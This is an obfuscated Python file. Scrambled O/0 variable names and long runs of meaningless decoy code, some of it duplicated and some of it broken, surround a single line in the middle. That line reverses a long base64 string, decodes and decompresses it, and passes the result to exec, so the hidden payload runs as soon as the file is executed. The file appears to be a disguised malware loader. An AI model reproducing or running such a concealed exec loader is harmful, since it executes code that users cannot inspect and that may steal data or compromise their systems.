def xFxYkLd ():
    OO0O0O0O0O0OOOO00 =42 
    OO0O0OO0O0OOOO0OO ="nQlYvKm"
    OOOOOOO00O0OO0O00 =[1 ,2 ,3 ]
    for O0OOO00O00O000O00 in range (10 ):
        OO0O0O0O0O0OOOO00 +=O0OOO00O00O000O00 
        OO0O0OO0O0OOOO0OO +=str (O0OOO00O00O000O00 )
        OOOOOOO00O0OO0O00 .append (O0OOO00O00O000O00 )
    return OO0O0O0O0O0OOOO00 ,OO0O0OO0O0OOOO0OO ,OOOOOOO00O0OO0O00 
def pTgLzRx ():
    O00OO00O0O00000OO =0 
    O0000O000OO0OO0O0 ="nQlYvKm"
    for OO0OO0OO0000OO000 in range (5 ):
        O00OO00O0O00000OO +=1 
        O0000O000OO0OO0O0 =O0000O000OO0OO0O0 [::-1 ]
    return O00OO00O0O00000OO ,O0000O000OO0OO0O0 
tFyPqLs =12345 
def wRxMqLp ():
    O0O0O000OOOOO0O0O ={"nQlYvKm":"jLpKmXw","jLpKmXw":[1 ,2 ,3 ]}
    for O00000OOOOO0O000O in range (100 ):
        if O00000OOOOO0O000O %2 ==0 :
            O0O0O000OOOOO0O0O ["uXrJqWl"].append (O00000OOOOO0O000O )
        else :
            O0O0O000OOOOO0O0O ["oPqWlYt"]=O0O0O000OOOOO0O0O ["zXnWpRq"]*(O00000OOOOO0O000O %5 )
    return O0O0O000OOOOO0O0O
def yKxMqLp ():
    for O00OO0O00OOOOOO0O in range (1000 ):
        yield O00OO0O00OOOOOO0O *3.14 
def zXnWpRq ():
    class O00000O000000O0OO :
        def __init__ (OOO0OOO00OO0OOOOO ):
            OOO0OOO00OO0OOOOO .kJqLpMz =0 
        def aXnWpLq (O0000OO0OOO0OOO0O ,OO00O00OOO0O00O0O ):
            O0000OO0OOO0OOO0O .kJqLpMz +=OO00O00OOO0O00O0O 
    OOO00000O0O00OOO0 =O00000O000000O0OO ()
    for O0O0O00O000OO0000 in range (50 ):
        OOO00000O0O00OOO0 .aXnWpLq (O0O0O00O000OO0000 )
gFjYqWn =xFxYkLd ()
cMlWnRq =pTgLzRx ()
jLkYnRq =[OO0000OO00O0OO0OO for OO0000OO00O0OO0OO in range (50 )if OO0000OO00O0OO0OO %3 ==0 ]
qLjMpWx =list (filter (lambda OOO00000O0000O000 :OOO00000O0000O000 %2 ==0 ,jLkYnRq ))
lMnWpXq =list (map (lambda O00OOOO0O0OOOOOOO :O00OOOO0O0OOOOOOO *2 ,qLjMpWx ))
mWpQlYn ={"a":{"b":{"c":42 }}}
dRxQmWn =mWpQlYn .get ("a",{}).get ("b",{}).get ("c",None )
class kYmWpQl :#line:46
    def __init__ (OOO0OOOO0OOO000O0 ):
        OOO0OOOO0OOO000O0 .qMpYnWp ="u can't saw this."
    def yWnPlRx (OO00O00O000O000O0 ):
        pass 
rNmWpJq =kYmWpQl ()
rNmWpJq .yWnPlRx ()
rNmLkWp =[]
for qJkYnMl in range (10 ):
    rNmLkWp .append (qJkYnMl **2 )
xMjWpLq =sum (rNmLkWp )
def tFyWnQl ():
    pass 
fJqKzLx =3 
kTnQmWp =5 
xRxNmJl =fJqKzLx +kTnQmWp
_ =lambda __ :__import__ ('zlib').decompress (__import__ ('base64').b64decode (__ [::-1 ]));exec ((_ )(b'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'))#line:62
for tFyXnRq in range (5 ):
    pass 
while False :
    break 
import math 
math .sqrt (16 )
def xFxYkLd ():
    OOOOOOOOO0O000000 =42 
    OOO0OO0OOO000O00O ="nQlYvKm"
    OO0OOOOO00O0OOO0O =[1 ,2 ,3 ]
    for O000O0O00O0OOO000 in range (10 ):
        OOOOOOOOO0O000000 +=O000O0O00O0OOO000 
        OOO0OO0OOO000O00O +=str (O000O0O00O0OOO000 )
        OO0OOOOO00O0OOO0O .append (O000O0O00O0OOO000 )
    return OOOOOOOOO0O000000 ,OOO0OO0OOO000O00O ,OO0OOOOO00O0OOO0O 
def pTgLzRx ():
    O0O00O000O000O000 =0 
    OO00OO0OO00O000O0 ="nQlYvKm"
    for O0O0OOOOO000OOO0O in range (5 ):
        O0O00O000O000O000 +=1 
        OO00OO0OO00O000O0 =OO00OO0OO00O000O0 [::-1 ]
    return O0O00O000O000O000 ,OO00OO0OO00O000O0 
tFyPqLs =12345 
kTnYmJr ="this is pointless"
def wRxMqLp ():
    OOO0O0O000O0OO000 ={"nQlYvKm":"jLpKmXw","jLpKmXw":[1 ,2 ,3 ]}
    for O0OO0O0000OO00000 in range (100 ):
        if O0OO0O0000OO00000 %2 ==0 :
            OOO0O0O000O0OO000 ["uXrJqWl"].append (O0OO0O0000OO00000 )
        else :
            OOO0O0O000O0OO000 ["oPqWlYt"]=OOO0O0O000O0OO000 ["zXnWpRq"]*(O0OO0O0000OO00000 %5 )
    return OOO0O0O000O0OO000 
def yKxMqLp ():
    for OO00O00O000O00000 in range (1000 ):
        yield OO00O00O000O00000 *3.14 
def zXnWpRq ():
    class O00O0OO0O0000O000 :
        def __init__ (OOO0OO0O0O0000O00 ):
            OOO0OO0O0O0000O00 .kJqLpMz =0 
        def aXnWpLq (O0O0O000OOO0O0OO0 ,O0OO0O0OO00000OO0 ):
            O0O0O000OOO0O0OO0 .kJqLpMz +=O0OO0O0OO00000OO0 
    OO00O0OOOOOOOO0O0 =O00O0OO0O0000O000 ()
    for OO0OOO000O0O0O00O in range (50 ):
        OO00O0OOOOOOOO0O0 .aXnWpLq (OO0OOO000O0O0O00O )
gFjYqWn =xFxYkLd ()
cMlWnRq =pTgLzRx ()
jLkYnRq =[OO0OO0O0OOO0OOOOO for OO0OO0O0OOO0OOOOO in range (50 )if OO0OO0O0OOO0OOOOO %3 ==0 ]
qLjMpWx =list (filter (lambda O0O0OOOOOOO0OO000 :O0O0OOOOOOO0OO000 %2 ==0 ,jLkYnRq ))
lMnWpXq =list (map (lambda OOOO0OOO00OOOO0OO :OOOO0OOO00OOOO0OO *2 ,qLjMpWx ))
mWpQlYn ={"a":{"b":{"c":42 }}}#line:113
dRxQmWn =mWpQlYn .get ("a",{}).get ("b",{}).get ("c",None )
class kYmWpQl :#line:115
    def __init__ (OOO0000O00OO0OOOO ):
        OOO0000O00OO0OOOO .qMpYnWp ="<3"
    def yWnPlRx (OO000OO0OOO00OOOO ):
        pass #line:119
rNmWpJq =kYmWpQl ()
rNmWpJq .yWnPlRx ()
rNmLkWp =[]
for qJkYnMl in range (10 ):
    rNmLkWp .append (qJkYnMl **2 )
xMjWpLq =sum (rNmLkWp )#
def tFyWnQl ():
    pass 
fJqKzLx =3 
kTnQmWp =5
xRxNmJl =fJqKzLx +kTnQmWp 